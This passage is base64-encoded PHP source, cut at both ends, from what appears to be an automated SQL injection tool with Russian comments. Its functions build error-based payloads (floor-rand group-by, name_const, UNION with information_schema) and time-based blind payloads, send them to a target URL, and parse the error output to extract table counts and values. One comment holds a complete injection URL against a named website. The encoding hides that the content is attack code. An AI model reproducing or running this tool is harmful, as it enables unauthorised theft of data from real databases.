QkJCQoJCQkJCQkvL3ByZWdfbWF0Y2hfYWxsKCJ+XF4oLio/KVxefmlzIiwkYXJyMjJbMF0sJGFycik7CgkJCQkJCQoJCQkJCQkvLyR0aGlzLT5kKCJ+XFt7JHZhbH1cXSguKj8pXFt7JHZhbH1cXX5pUyIsJ3JlZyBBTEwnKTsKCQkJCQkJCgkJCQkJCS8vJHRoaXMtPmQoJGFyciwnYXJyQV9MTEwgUE9MRSBIRVgnKTsKCQkJCQkJCgkJCQkJCQoJCQkJCQkJCgkJCQkJCQoJCQkJCSRqPTE7CgkJCQkJCgkJCQkJZm9yZWFjaCAoJHBvbGUgYXMgJHZhbCkKCQkJCQl7CgkJCQkJCQoJCQkJCQkKCQkJCQkJCgkJCQkJCS8vaWYoc3RybGVuKCRhcnJbMV1bMF0pPjUwMClyZXR1cm4gZmFsc2U7CQoJCQkJCQkKCQkJCQoJCQkJCQlpZihpc3NldCgkYXJyWzFdWzBdKSkKCQkJCQkJewoJCQkJCQkJCgkJCQkJCQkkYXJyWzFdWzBdID0gc3RyX3JlcGxhY2UoJ15eJywnXicsJGFyclsxXVswXSk7CgkJCQkJCQkKCQkJCQkJCSRiID0gZXhwbG9kZSgnXicsJGFyclsxXVswXSk7CgkJCQkJCQkKCQkJCQkJCSRiX2JldyA9IGFycmF5X2ZpbHRlcigkYiwgZnVuY3Rpb24oJGVsZW1lbnQpIHsKCQkJCQkJCQlyZXR1cm4gIWVtcHR5KCRlbGVtZW50KTsKCQkJCQkJCX0pOwoJCQkJCQkJCgkJCQkJCQkKCQkJCQkJCS8vJHRoaXMtPmQoJGIsJ2InKTsKCQkJCQkJCS8vJHRoaXMtPmQoJGJfYmV3LCdiX25ldycpOwoJCQkJCQkJCgkJCQkJCQkkZXhwb3J0WyR2YWxdID0gJGJbJGpdOwoJCQkJCQl9ZWxzZQoJCQkJCQl7CgkJCQkJCQkkZXhwb3J0WyR2YWxdID0gJyc7CgkJCQkJCgoJCQkJCQl9CgkJCQkJCQoJCQkJCQkkaisrOwoJCQkJCQkKCQkJCQl9CgkJCQkJCgkJCQkJCgkJCQkJCgkJCQl9CgkJCQoJCS8vCSR0aGlzLT5kKCRleHBvcnQsJyRleHBvcnQnKTsKCQkJLy9leGl0OwoJCQkKCQkJaWYoaXNzZXQoJGV4cG9ydCkpCgkJCXsJCgkJCQlyZXR1cm4gJGV4cG9ydDsKCQkJfQoJCQkKCQkJcmV0dXJuIGZhbHNlOwoKCX0KCgkKCQoJCglmdW5jdGlvbiBteXNxbEdldEFsbFZhbHVlKCRiZCwkdGFibGUsJG5lZWRsZSwkY291bnQ9MCwkb3JkZXI9YXJyYXkoKSwkd2hlcmU9Jycpey8v0J/QvtC70YPRh9C10L3QuNC1INCy0YHQtdGFINGA0LXQt9GD0LvRjNGC0LDRgtC+0LIKCQkKCQkJCgkJLy8kdGhpcy0+ZCgkY291bnQsJyRjb3VudDEnKTsJCgkJLy9leGl0OwoJCS8vJGNvdW50ID0gMzsKCQlpZihpbnR2YWwoJGNvdW50KT09MCkkY291bnQgPSAkdGhpcy0+bXlzcWxHZXRDb3VudEluc2VydCgkYmQsJHRhYmxlLCR3aGVyZSk7CgoJCS8vJGNvdW50PTE7CgkJLy8kdGhpcy0+ZCgkY291bnQsJyRjb3VudCAyISEhJyk7CQoJCQoJCWlmKCRjb3VudCA+MCkKCQl7CQoJCQlmb3IoJGk9MDskaTwkY291bnQ7JGkrKykKCQkJewoJCQkJJG5ld1tdID0gICR0aGlzLT5teXNxbEdldFZhbHVlKCRiZCwkdGFibGUsJG5lZWRsZSwkaSwkb3JkZXIsJHdoZXJlKTsKCQkJCS8vJHRoaXMtPmQoJG5ldywnbmV3Jyk7CgkJCQkJLy9yZXR1cm4gJG5ldzsJCgkJCX0KCQkJCgkJCXJldHVybiAkbmV3OwoJCX1lbHNlCgkJewoJCQlyZXR1cm4gMDsKCQl9CgoJfQoJCgkKCQoJCglmdW5jdGlvbiBteXNxbEdldENvdW50SW5zZXJ0T0xEKCRiZCwkdGFibGUsJHdoZXJlPScnKXsgLy/QvtCx0YnQsNGPIC0gINC/0L7QtNGB0YfRkdGCINC30LDQv9C40YHQtdC5INCyINGC0LDQsdC70LjRhtC1CgkJCgkJJGxpbWl0ID0gJyc7CgkJCgkJaWYoJHRoaXMtPm1ldGhvZCA9PSAxMCl7CgkJCQoJCQkkcXVlcnkgPSAiIjsvL9C90LDRh9Cw0LvRjNC90YvQuSDQt9Cw0L/RgNC+0YEg0LTQu9GPIHNsZWVwCgkJCSRrID0gJHRoaXMtPnNldFsnc2xlZXAnXVsnY29tZW50J107CgkJCSR0cnVlID0gZmFsc2U7CgkJCQoJCQkKCQkJZm9yKCRjb2w9MTskY29sPD0kdGhpcy0+Y29sdW1uOyRjb2wrKykKCQkJewoKCQkJCWlmKCRjb2w9PTEpeyR6YXA9Jyc7fWVsc2V7JHphcD0nLCc7fQoJCQkJCgkJCQlpZihpbl9hcnJheSgkY29sLCAkdGhpcy0+d29yaykgQU5EICR0cnVlPT1mYWxzZSkKCQkJCXsKCgkJCQkJJHAgPSAkY29sLTE7CgkJCQkJCQoJCQkJCSRxdWVyeSAuPSAkemFwLiJDT05DQVQoQ0hBUigiLiR0aGlzLT5jaGFyY2hlcignW1hdJykuIiksY291bnQoKiksQ0hBUigiLiR0aGlzLT5jaGFyY2hlcignW1hdJykuIikpIjsKCQkJCQkJCgkJCQkJJHRydWUgPSB0cnVlOwoJCQkJCQoJCQkJfWVsc2UKCQkJCXsKCQkJCQkkcXVlcnkgLj0gJHphcC4kY29sOwkKCQkJCX0KCQkJfQoJCQkKCQkJCSRxID0gJHF1ZXJ5LicgRnJvTSAnLiRiZC4nLicuJHRhYmxlLicgJy4kd2hlcmU7CgkJCQkKCQkJCSRxID0gc3RyX3JlcGxhY2UoJywsJywgJywnLCRxKTsKCQkJCQoJCQkJLy8kdGhpcy0+ZCgkcSwnaW5zZXJ0Jyk7CgkJCQkKCQkJCSRmaWxlID0gJHRoaXMtPnNlbmRfc3FsKCdTRWxlQ1QgJy4kcSxmYWxzZSk7CgkJCQkJCgkJCQkvL3ByaW50X3IoJGZpbGUpOwkKCQkJCgkJCQlwcmVnX21hdGNoX2FsbCgnflxbWFxdKC4qPylcW1hcXX4nLCRmaWxlLCRhcnIpOwoJCQkJCgkJCQlpZighaXNzZXQoJGFyclsxXVswXSkpZmFsc2U7CgkJCQlyZXR1cm4gQCRhcnJbMV1bMF07CgkJCQoJCQkKCQkJCgkJfQoKCQlpZigkdGhpcy0+bWV0aG9kPT02KXsKCgkJCSRxcSA9ICcoU0VMRUNUK2NvdW50KCopK2Zyb20rJy4kYmQuJy4nLiR0YWJsZS4nKycuJHdoZXJlLicpJzsKCgkJCSR1cmwgPSAkdGhpcy0+dXJsLiR0aGlzLT5nZXRfYnlfZXJyb3IuJytvcisoMSwyKT0oc2VsZWN0KmZyb20oc2VsZWN0JTIwbmFtZV9jb25zdCgnLiRxcS4nLDEpLG5hbWVfY29uc3QoJy4kcXEuJywxKStmcm9tKycuJGJkLicuJy4kdGFibGUuJytsaW1pdCsxKWEpK0FORCsnLiR0aGlzLT5nZXRfYnlfZXJyb3IuJ3gnLiR0aGlzLT5nZXRfYnlfZXJyb3IuJz0nLiR0aGlzLT5nZXRfYnlfZXJyb3IuJ3gnOwoJCQkJCQkJCQkJCQoJCQkkZmlsZSA9ICR0aGlzLT5nZXRDb250ZW50cygkdXJsKTsKCgoJCQlwcmVnX21hdGNoX2FsbCgiflxEdXBsaWNhdGUgY29sdW1uIG5hbWUgXCcoLio/KVwnfiIsJGZpbGUsJGFycik7CgkJCQkKCQkJcmV0dXJuICRhcnJbMV1bMF07CgoJCQkKCQl9CgkJCgkJaWYoJHRoaXMtPm1ldGhvZD09NSl7CgkJCgkJCS8vJGNvdW50ID0gJHRoaXMtPm15c3FsR2V0QnlPcmRlcigkYmQsICR0YWJsZSwgJ2NvdW50KCopJywwLGFycmF5KCksJHdoZXJlKTsKCQkJCQkJCgkJCSR1cmwgPSAkdGhpcy0+dXJsLicrYW5kJTI4c2VsZWN0KzErZnJvbSUyOHNlbGVjdCtjb3VudCUyOColMjklMkNjb25jYXQlMjglMjhzZWxlY3QrJTI4c2VsZWN0KyUyOFNFTEVDVCtkaXN0aW5jdCtjb25jYXQlMjgweDdlJTJDMHgyNyUyQ2NvdW50KCopJTJDMHgyNyUyQzB4N2UlMjkrRlJPTSsnLiRiZC4nLicuJHRhYmxlLicrJy4kd2hlcmUuJyslMjklMjkrZnJvbStpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzK2xpbWl0KzAlMkMxJTI5JTJDZmxvb3IlMjhyYW5kJTI4MCUyOSoyJTI5JTI5eCtmcm9tK2luZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMrZ3JvdXArYnkreCUyOWElMjkrYW5kKzElM0QxJzsKCQkKCQkJJGZpbGUgPSAkdGhpcy0+Z2V0Q29udGVudHMoJHVybCk7CgkJCgkJCXByZWdfbWF0Y2hfYWxsKCJ+XFwnXH5cJyguKj8pXCdcfjFcJyBmb3Iga2V5fiIsJGZpbGUsJGFycik7CgoJCgkJCXJldHVybiAkYXJyWzFdWzBdOwoKCQl9CgkJCgkJaWYoJHRoaXMtPm1ldGhvZD09NCl7CgkJCgkJCSR1cmwgPSAkdGhpcy0+dXJsLicxOTk5OTk5OTk5OScuJHRoaXMtPmdldF9ieV9lcnJvci4nK29yKyhzZWxlY3QrY291bnQoKilmcm9tKHNlbGVjdCsxK3VuaW9uK3NlbGVjdCsyK3VuaW9uK3NlbGVjdCszKXgrZ3JvdXArYnkrY29uY2F0KG1pZCgoc2VsZWN0K2NvdW50KCopK2Zyb20rJy4kYmQuJy4nLiR0YWJsZS4nKycuJHdoZXJlLicpLDEsNjQpLGZsb29yKHJhbmQoMCkqMikpKSstLSsnLiR0aGlzLT5nZXRfYnlfZXJyb3IuJ3gnLiR0aGlzLT5nZXRfYnlfZXJyb3IuJz0nLiR0aGlzLT5nZXRfYnlfZXJyb3IuJ3gnOwoJCQkJCQkJCgkJCSRmaWxlID0gJHRoaXMtPmdldENvbnRlbnRzKCR1cmwpOwoKCQkJcHJlZ19tYXRjaF9hbGwoIn5cRHVwbGljYXRlIGVudHJ5IFwnKC4qPykxXCcgZm9yIGtleX4iLCRmaWxlLCRhcnIpOwoJCQkKCQkJcmV0dXJuICRhcnJbMV1bMF07CgoJCX0KCQkKCQkkYmQgPSAgICBzdHJfcmVwbGFjZSgnICcsICcrJywkYmQpOwoJCSR3aGVyZSA9IHN0cl9yZXBsYWNlKCcgJywgJysnLCR3aGVyZSk7CgkJJHRhYmxlID0gc3RyX3JlcGxhY2UoJyAnLCAnKycsJHRhYmxlKTsKCQkKCQkKCQkkbiA9ICR0aGlzLT52YXJpYW50X3F1ZXJ5WyR0aGlzLT5zcG9zb2JdWyR0aGlzLT5tZXRob2RdWzBdOwoJCSRrID0gJHRoaXMtPnZhcmlhbnRfcXVlcnlbJHRoaXMtPnNwb3NvYl1bJHRoaXMtPm1ldGhvZF1bMV07CgoKCQkkcXVlcnkgPSAiMTExMTExMTExMTExMSRuIjsKCQkkdHJ1ZSA9IGZhbHNlOwoKCQlmb3IoJGNvbD0xOyRjb2w8PSR0aGlzLT5jb2x1bW47JGNvbCsrKQoJCXsKCgkJCWlmKCRjb2w9PTEpeyR6YXA9Jyc7fWVsc2V7JHphcD0nLCc7fQoJCQkKCQkJaWYoaW5fYXJyYXkoJGNvbCwgJHRoaXMtPndvcmspIEFORCAkdHJ1ZT09ZmFsc2UpCgkJCXsKCgkJCQkkcCA9ICRjb2wtMTsKCQkJCQkKCQkJCSRxdWVyeSAuPSAkemFwLiJDT05DQVQoQ0hBUigiLiR0aGlzLT5jaGFyY2hlcignW1hdJykuIiksY291bnQoKiksQ0hBUigiLiR0aGlzLT5jaGFyY2hlcignW1hdJykuIikpIjsKCQkJCQkKCQkJCSR0cnVlID0gdHJ1ZTsKCQkJCQoJCQl9ZWxzZXsKCQkJCSRxdWVyeSAuPSAkemFwLiIxMyI7CQoJCQl9CgkJfQoJCQoJCQkJJHVybDEgPSAkdGhpcy0+dXJsLiRxdWVyeS4nK0ZST00rJy4kYmQuJy4nLiR0YWJsZS4nKycuJHdoZXJlLicrJy4kazsKCQkJCQoJCQlpZigkdGhpcy0+ZGVidWc9PXRydWUpewkkdGhpcy0+ZCgkdXJsMSwnbXlzcWxHZXRDb3VudEluc2VydCcpO30KCgkJCQkkZmlsZSA9ICR0aGlzLT5nZXRDb250ZW50cygkdXJsMSk7CgoJCQkJcHJlZ19tYXRjaF9hbGwoJ35cW1hcXSguKj8pXFtYXF1+JywkZmlsZSwkYXJyKTsKCQkJCQoJCQkJCgkJCQlpZighaXNzZXQoJGFyclsxXVswXSkpZmFsc2U7CgkJCQlyZXR1cm4gQCRhcnJbMV1bMF07CgkJCgl9CgkKCWZ1bmN0aW9uIG15c3FsR2V0Q291bnRJbnNlcnQoJGJkLCR0YWJsZSwkd2hlcmU9JycpeyAvL9C+0LHRidCw0Y8gLSAg0L/QvtC00YHRh9GR0YIg0LfQsNC/0LjRgdC10Lkg0LIg0YLQsNCx0LvQuNGG0LUKCQkKCQkkbGltaXQgPSAnJzsKCQkKCQlpZigkdGhpcy0+bWV0aG9kID09IDEwKXsKCQkJCgkJCSRxdWVyeSA9ICIiOy8v0L3QsNGH0LDQu9GM0L3Ri9C5INC30LDQv9GA0L7RgSDQtNC70Y8gc2xlZXAKCQkJJGsgPSAkdGhpcy0+c2V0WydzbGVlcCddWydjb21lbnQnXTsKCQkJJHRydWUgPSBmYWxzZTsKCQkJCgkJCQoJCQlmb3IoJGNvbD0xOyRjb2w8PSR0aGlzLT5jb2x1bW47JGNvbCsrKQoJCQl7CgoJCQkJaWYoJGNvbD09MSl7JHphcD0nJzt9ZWxzZXskemFwPScsJzt9CgkJCQkKCQkJCWlmKGluX2FycmF5KCRjb2wsICR0aGlzLT53b3JrKSBBTkQgJHRydWU9PWZhbHNlKQoJCQkJewoKCQkJCQkkcCA9ICRjb2wtMTsKCQkJCQkJCgkJCQkJJHF1ZXJ5IC49ICR6YXAuIkNPTkNBVChDSEFSKCIuJHRoaXMtPmNoYXJjaGVyKCdbWF0nKS4iKSxjb3VudCgqKSxDSEFSKCIuJHRoaXMtPmNoYXJjaGVyKCdbWF0nKS4iKSkiOwoJCQkJCQkKCQkJCQkkdHJ1ZSA9IHRydWU7CgkJCQkJCgkJCQl9ZWxzZQoJCQkJewoJCQkJCSRxdWVyeSAuPSAkemFwLiRjb2w7CQoJCQkJfQoJCQl9CgkJCQoJCQkJJHEgPSAkcXVlcnkuJyBGcm9NICcuJGJkLicuJy4kdGFibGUuJyAnLiR3aGVyZTsKCQkJCQoJCQkJJHEgPSBzdHJfcmVwbGFjZSgnLCwnLCAnLCcsJHEpOwoJCQkJCgkJCQkvLyR0aGlzLT5kKCRxLCdpbnNlcnQnKTsKCQkJCQoJCQkJJGZpbGUgPSAkdGhpcy0+c2VuZF9zcWwoJ1NFbGVDVCAnLiRxLGZhbHNlKTsKCQkJCQkKCQkJCS8vcHJpbnRfcigkZmlsZSk7CQoJCQkKCQkJCXByZWdfbWF0Y2hfYWxsKCcvXFtYXF0oLio/KVxbWFxdLycsJGZpbGUsJGFycik7CgkJCQkKCQkJCWlmKCFpc3NldCgkYXJyWzFdWzBdKSlmYWxzZTsKCQkJCXJldHVybiBAJGFyclsxXVswXTsKCQkJCgkJCQoJCQkKCQl9CgoJCWlmKCR0aGlzLT5tZXRob2Q9PTYpewoKCQkJJHFxID0gJyhTRUxFQ1QrY291bnQoKikrZnJvbSsnLiRiZC4nLicuJHRhYmxlLicrJy4kd2hlcmUuJyknOwoKCQkJJHVybCA9ICR0aGlzLT51cmwuJHRoaXMtPmdldF9ieV9lcnJvci4nK29yKygxLDIpPShzZWxlY3QqZnJvbShzZWxlY3QlMjBuYW1lX2NvbnN0KCcuJHFxLicsMSksbmFtZV9jb25zdCgnLiRxcS4nLDEpK2Zyb20rJy4kYmQuJy4nLiR0YWJsZS4nK2xpbWl0KzEpYSkrQU5EKycuJHRoaXMtPmdldF9ieV9lcnJvci4neCcuJHRoaXMtPmdldF9ieV9lcnJvci4nPScuJHRoaXMtPmdldF9ieV9lcnJvci4neCc7CgkJCQkJCQkJCQkJCgkJCSRmaWxlID0gJHRoaXMtPmdldENvbnRlbnRzKCR1cmwpOwoKCgkJCXByZWdfbWF0Y2hfYWxsKCJ+XER1cGxpY2F0ZSBjb2x1bW4gbmFtZSBcJyguKj8pXCd+IiwkZmlsZSwkYXJyKTsKCQkJCQoJCQlyZXR1cm4gJGFyclsxXVswXTsKCgkJCQoJCX0KCQkKCQlpZigkdGhpcy0+bWV0aG9kPT01KXsKCQkKCQkJLy8kY291bnQgPSAkdGhpcy0+bXlzcWxHZXRCeU9yZGVyKCRiZCwgJHRhYmxlLCAnY291bnQoKiknLDAsYXJyYXkoKSwkd2hlcmUpOwoJCQkJCQkKCQkJJHVybCA9ICR0aGlzLT51cmwuJythbmQlMjhzZWxlY3QrMStmcm9tJTI4c2VsZWN0K2NvdW50JTI4KiUyOSUyQ2NvbmNhdCUyOCUyOHNlbGVjdCslMjhzZWxlY3QrJTI4U0VMRUNUK2Rpc3RpbmN0K2NvbmNhdCUyODB4N2UlMkMweDI3JTJDY291bnQoKiklMkMweDI3JTJDMHg3ZSUyOStGUk9NKycuJGJkLicuJy4kdGFibGUuJysnLiR3aGVyZS4nKyUyOSUyOStmcm9tK2luZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMrbGltaXQrMCUyQzElMjklMkNmbG9vciUyOHJhbmQlMjgwJTI5KjIlMjklMjl4K2Zyb20raW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcytncm91cCtieSt4JTI5YSUyOSthbmQrMSUzRDEnOwoJCQoJCQkkZmlsZSA9ICR0aGlzLT5nZXRDb250ZW50cygkdXJsKTsKCQkKCQkJcHJlZ19tYXRjaF9hbGwoIn5cXCdcflwnKC4qPylcJ1x+MVwnIGZvciBrZXl+IiwkZmlsZSwkYXJyKTsKCgkKCQkJcmV0dXJuICRhcnJbMV1bMF07CgoJCX0KCQkKCQlpZigkdGhpcy0+bWV0aG9kPT00KXsKCQkKCQkJJHVybCA9ICR0aGlzLT51cmwuJzE5OTk5OTk5OTk5Jy4kdGhpcy0+Z2V0X2J5X2Vycm9yLicrb3IrKHNlbGVjdCtjb3VudCgqKWZyb20oc2VsZWN0KzErdW5pb24rc2VsZWN0KzIrdW5pb24rc2VsZWN0KzMpeCtncm91cCtieStjb25jYXQobWlkKChzZWxlY3QrY291bnQoKikrZnJvbSsnLiRiZC4nLicuJHRhYmxlLicrJy4kd2hlcmUuJyksMSw2NCksZmxvb3IocmFuZCgwKSoyKSkpKy0tKycuJHRoaXMtPmdldF9ieV9lcnJvci4neCcuJHRoaXMtPmdldF9ieV9lcnJvci4nPScuJHRoaXMtPmdldF9ieV9lcnJvci4neCc7CgkJCQkJCQkKCQkJJGZpbGUgPSAkdGhpcy0+Z2V0Q29udGVudHMoJHVybCk7CgoJCQlwcmVnX21hdGNoX2FsbCgiflxEdXBsaWNhdGUgZW50cnkgXCcoLio/KTFcJyBmb3Iga2V5fiIsJGZpbGUsJGFycik7CgkJCQoJCQlyZXR1cm4gJGFyclsxXVswXTsKCgkJfQoJCQoJCSRiZCA9ICAgIHN0cl9yZXBsYWNlKCcgJywgJysnLCRiZCk7CgkJJHdoZXJlID0gc3RyX3JlcGxhY2UoJyAnLCAnKycsJHdoZXJlKTsKCQkkdGFibGUgPSBzdHJfcmVwbGFjZSgnICcsICcrJywkdGFibGUpOwoJCQoJCQoJCWlmKCR0YWJsZSE9PScnKQoJCXsKCQkJCgkJCWlmKCRiZD09JycpewoJCQkJJGZyb20gPSAnRlJPTSsnLiR0YWJsZS4nJzsKCQkJfWVsc2V7CgkJCQkkZnJvbSA9ICdGUk9NKycuJGJkLicuJy4kdGFibGUuJyc7CgkJCX0KCQl9ZWxzZXsKCQkJJGZyb20gPSAnJzsKCQl9CgkJCgkJCgkJCgkJJG4gPSAkdGhpcy0+dmFyaWFudF9xdWVyeVskdGhpcy0+c3Bvc29iXVskdGhpcy0+bWV0aG9kXVswXTsKCQkkayA9ICR0aGlzLT52YXJpYW50X3F1ZXJ5WyR0aGlzLT5zcG9zb2JdWyR0aGlzLT5tZXRob2RdWzFdOwoKCgkJJHF1ZXJ5ID0gIjExMTExMTExMTExMTEkbiI7CgkJJHRydWUgPSBmYWxzZTsKCgkJZm9yKCRjb2w9MTskY29sPD0kdGhpcy0+Y29sdW1uOyRjb2wrKykKCQl7CgoJCQlpZigkY29sPT0xKXskemFwPScnO31lbHNleyR6YXA9JywnO30KCQkJCgkJCWlmKGluX2FycmF5KCRjb2wsICR0aGlzLT53b3JrKSBBTkQgJHRydWU9PWZhbHNlKQoJCQl7IAoKCQkKCQkJCS8vaHR0cDovL2V2aWxnYW1lcnouY29tL2Rvd25sb2Fkcy9pbmRleC5waHA/em9la3N0cmluZz0mc29ydHdheT10aXRsZSZzb3J0PWYnIGFuZCgvKiovc0VsRWNUIDEgLyoqL2ZSb00oLyoqL3NFbEVjVCBjb3VudCgqKSwvKiovY09uQ2FUKCgvKiovc0VsRWNUKC8qKi9zRWxFY1QoLyoqL3NFbEVjVCAvKiovY09uQ2FUKDB4MjE3ZTIxLGNvdW50KDApLDB4MjE3ZTIxKSAvKiovZlJvTSBpbmZvcm1hdGlvbl9zY2hlbWEuLyoqL3RBYkxlUyAvKiovd0hlUmUgLyoqL3RBYkxlX3NDaEVtQT0weDY1NzY2OTZjNjc2MTZkNjU3MjdhNWY2MzZmNmQ1ZjJkNWY2NDYyMzMpKSAvKiovZlJvTSBpbmZvcm1hdGlvbl9zY2hlbWEuLyoqL3RBYkxlUyAvKiovbEltSXQgMCwxKSxmbG9vcihyYW5kKDApKjIpKXggLyoqL2ZSb00gaW5mb3JtYXRpb25fc2NoZW1hLi8qKi90QWJMZVMgLyoqL2dSb1VwLyoqL2JZIHgpYSkgYW5kICcxJz0nMSZwYWdlPTIwCgkJCgkJCgkJCQkkcCA9ICRjb2wtMTsKCQkJCQkKCQkJCS8vCSRxdWVyeSAuPSAkemFwLiIoc2VsZWN0K0NPTkNBVChDSEFSKCIuJHRoaXMtPmNoYXJjaGVyKCdkZGQnKS4iKSwkemFwcikiLicrJy4kZnJvbS4nKycuJHdoZXJlLicrJy4kb3JkZXIyLicrbGltaXQrJy4kbGltaXQuIiApIjsJCgkJCQkJCgkJCQkvLyRxdWVyeSAuPSAkemFwLiJDT05DQVQoQ0hBUigiLiR0aGlzLT5jaGFyY2hlcignW1hdJykuIiksY291bnQoKiksQ0hBUigiLiR0aGlzLT5jaGFyY2hlcignW1hdJykuIikpIjsKCQkJCQoJCQkJLy8JJHphcHIgLj0gInVuaGV4KEhleChjYXN0KCR2YWwgYXMgY2hhcikpKSI7CgkJCQkKCQkJCQkKCQkJCSRxdWVyeSAuPSAkemFwLiIoc2VsZWN0K0NPTkNBVChDSEFSKCIuJHRoaXMtPmNoYXJjaGVyKCdbWF0nKS4iKSxjb3VudCgqKSxDSEFSKCIuJHRoaXMtPmNoYXJjaGVyKCdbWF0nKS4iKSkiLicrJy4kZnJvbS4nKycuJHdoZXJlLiIpIjsJCQoJCQkJLy8kcXVlcnkgLj0gJHphcC4iKHNlbGVjdCtDT05DQVQoQ0hBUigiLiR0aGlzLT5jaGFyY2hlcignW1hdJykuIiksQ0hBUigiLiR0aGlzLT5jaGFyY2hlcignY291bnQqJykuIiksQ0hBUigiLiR0aGlzLT5jaGFyY2hlcignW1hdJykuIikpIi4nKycuJGZyb20uJysnLiR3aGVyZS4iKSI7CQkKCQkJCQoJCQkJLy8nV0hFUkUgVEFCTEVfU0NIRU1BPScuJHRoaXMtPnN0clRvSGV4KCRiZCkuJycpOwoJCQkJCQoJCQkJJHRydWUgPSB0cnVlOwoJCQkJCgkJCX1lbHNlewoJCQkJLy8kcXVlcnkgLj0gJHphcC4iMTMiOwoJCQkJJHF1ZXJ5IC49ICR6YXAuJGNvbDsJCQkJCQoJCQl9CgkJfQoJCQoJCQlpZigkdGhpcy0+ZGVidWc9PXRydWUpewkkdGhpcy0+ZCgkcXVlcnksJyAkcXVlcnkgbXlzcWxHZXRDb3VudEluc2VydCcpO30KCQkJCgkJCQkvLyR1cmwxID0gJHRoaXMtPnVybC4kcXVlcnkuJytGUk9NKycuJGJkLicuJy4kdGFibGUuJysnLiR3aGVyZS4nKycuJGs7CgkJCQkkdXJsMSA9ICR0aGlzLT51cmwuJHF1ZXJ5LicrJy4kazsKCQkJCSR1cmwxID0gc3RyX3JlcGxhY2UoJywsJywgJywnLCR1cmwxKTsKCQkJCSR1cmwxID0gc3RyX3JlcGxhY2UoJysrKycsICcrJywkdXJsMSk7CgkJCQkvLyR1cmwxID0gc3RyX3JlcGxhY2UoJysrJywgJysnLCR1cmwxKTsKCQkJCQoJCQkJLy9pZigkdGhpcy0+ZGVidWc9PXRydWUpewkkdGhpcy0+ZCgkdXJsMSwnbXlzcWxHZXRDb3VudEluc2VydCcpO30KCgkJCQkkZmlsZSA9ICR0aGlzLT5nZXRDb250ZW50cygkdXJsMSk7CgoJCQkJcHJlZ19tYXRjaF9hbGwoJy9cW1hcXSguKj8pXFtYXF0vJywkZmlsZSwkYXJyKTsKCQkJCQoJCQkJCgkJCQlpZigkdGhpcy0+ZGVidWc9PXRydWUpewkkdGhpcy0+ZCgkYXJyLCdteXNxbEdldENvdW50SW5zZXJ0IEFSUicpO30KCQkJCQoJCQkJCgkJCQlpZighaXNzZXQoJGFyclsxXVswXSkpZmFsc2U7CgkJCQlyZXR1cm4gQCRhcnJbMV1bMF07CgkJCgl9CgkKCQoJCglmdW5jdGlvbiBteXNxbEdldFZhbHVlU2xlZXAoJGJkLCR0YWJsZSwkcG9sZSwkbGltaXQ9MCwkb3JkZXI9YXJyYXkoKSwkd2hlcmU9JycpewoJCQoJCQlpZigkdGhpcy0+bWV0aG9kX2hleCA9PXRydWUgIEFORCAkdGhpcy0+bWV0aG9kX2F1dG8gPT1mYWxzZSl7CgkJCQkkZGF0YSA9ICR0aGlzLT5teXNxbEdldFZhbHVlU2xlZXBIRVgoJGJkLCR0YWJsZSwkcG9sZSwkbGltaXQsJG9yZGVyLCR3aGVyZSk7CgkJCQlyZXR1cm4gJGRhdGE7CgkJCX0KCQkJCgkJCQoJCQlpZigkdGhpcy0+bWV0aG9kX2NoYXIgPT10cnVlIEFORCAkdGhpcy0+bWV0aG9kX2F1dG8gPT1mYWxzZSl7CgkJCQkkZGF0YSA9ICR0aGlzLT5teXNxbEdldFZhbHVlU2xlZXBDSEFSKCRiZCwkdGFibGUsJHBvbGUsJGxpbWl0LCRvcmRlciwkd2hlcmUpOwoJCQkJcmV0dXJuICRkYXRhOwoJCQl9CgkJCQoJCQkKCQkJCgkJCWlmKCR0aGlzLT5tZXRob2RfYXV0byA9PXRydWUpCgkJCXsKCQkJCgkJCQkKCQkJCQoJCQkJaWYoJHRoaXMtPm1ldGhvZF9oZXggPT10cnVlKXsKCQkJCQkKCQkJCQkkZGF0YSA9ICR0aGlzLT5teXNxbEdldFZhbHVlU2xlZXBIRVgoJGJkLCR0YWJsZSwkcG9sZSwkbGltaXQsJG9yZGVyLCR3aGVyZSk7CgkJCQl9ZWxzZQoJCQkJewoJCQkJCQoJCQkJCQoJCQkJCWlmKCR0aGlzLT5tZXRob2RfY2hhciA9PXRydWUpCgkJCQkJewoJCQkJCQkkZGF0YSA9ICR0aGlzLT5teXNxbEdldFZhbHVlU2xlZXBDSEFSKCRiZCwkdGFibGUsJHBvbGUsJGxpbWl0LCRvcmRlciwkd2hlcmUpOwoJCQkJCQkKCQkJCQkJaWYoJGRhdGFbMF0gIT0nJyBBTkQgY291bnQoJGRhdGEpPT0wKQoJCQkJCQl7CgkJCQkJCQkkdGhpcy0+bWV0aG9kX2NoYXIgPSB0cnVlOwoJCQkJCQkJcmV0dXJuICRkYXRhOwoJCQkJCQl9CgkJCQkJCQoJCQkJCX0KCQkJCQkKCQkJCQoJCQkJCQoJCQkJCQoJCQkJCWlmKCRkYXRhWzBdPT0nJyBBTkQgY291bnQoJGRhdGEpPT0wKQoJCQkJCXsKCQkJCQkJCgkJCQkJCSRkYXRhID0gJHRoaXMtPm15c3FsR2V0VmFsdWVTbGVlcEhFWCgkYmQsJHRhYmxlLCRwb2xlLCRsaW1pdCwkb3JkZXIsJHdoZXJlKTsKCQkJCQkJCgkJCQkJCQoJCQkJCQlpZigkZGF0YVswXSA9PScnIEFORCBjb3VudCgkZGF0YSk9PTApCgkJCQkJCXsKCQkJCQkJCQoJCQkJCQkJJGRhdGEgPSAkdGhpcy0+bXlzcWxHZXRWYWx1ZVNsZWVwQ0hBUigkYmQsJHRhYmxlLCRwb2xlLCRsaW1pdCwkb3JkZXIsJHdoZXJlKTsKCQkJCQkJCQoJCQkJCQkJaWYoJGRhdGFbMF0gPT0nJyBBTkQgY291bnQoJGRhdGEpPT0wKQoJCQkJCQkJewoJCQkJCQkJCQkKCQkJCQkJCQkkdGhpcy0+bWV0aG9kX2hleCA9IHRydWU7CgkJCQkJCQkJCQoJCQkJCQkJCQkKCQkJCQkJCX1lbHNlewoJCQkJCQkJCSR0aGlzLT5tZXRob2RfY2hhciA9dHJ1ZTsKCQkJCQkJCX0KCQkJCQkJCQoJCQkJCQl9ZWxzZXsKCQkJCQkJCSR0aGlzLT5tZXRob2RfaGV4ID0gdHJ1ZTsKCQkJCQkJfQoJCQkJCQkJCgkJCQkJCQoJCQkJCQkJCgkJCQkJfQoJCQkJfQoJCQkJCgkJCQkKCQkJC